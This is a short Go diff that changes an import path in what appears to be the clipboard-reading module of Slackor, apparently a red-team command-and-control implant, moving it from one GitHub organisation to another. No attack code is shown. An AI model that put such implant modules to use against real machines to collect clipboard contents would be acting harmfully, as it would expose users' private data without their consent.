@@ -1,8 +1,8 @@
 package common
 
 import (
-	"github.com/Coalfire-Research/Slackor/pkg/command"
 	"github.com/atotto/clipboard"
+	"github.com/n00py/Slackor/pkg/command"
 )
 
 // Clipboard reads the clipboard
